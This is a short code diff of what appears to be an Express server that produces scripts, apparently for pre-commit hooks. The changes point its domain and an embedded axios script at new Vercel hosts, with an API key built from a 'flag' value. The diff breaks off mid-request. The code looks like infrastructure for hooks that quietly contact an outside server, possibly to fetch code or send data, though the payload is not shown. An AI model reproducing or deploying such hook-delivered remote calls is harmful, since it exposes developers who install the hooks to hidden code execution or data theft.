@@ -24,7 +24,7 @@ const generalLimiter = rateLimit({
 
 // --- Valid tokens for API access ---
 const VALID_FLAGS = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
-const VERCEL_DOMAIN = "precommit-chk.vercel.app"
+const VERCEL_DOMAIN = "precommit-chk-one.vercel.app"
 
 // --- App Settings ---
 app.set("trust proxy", false); // Important for correct IP extraction on Vercel
@@ -456,7 +456,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "walter-server.vercel.app";
+const host = "server-victory5.vercel.app";
 const apikey = "60${flag}";
 axios
   .get(
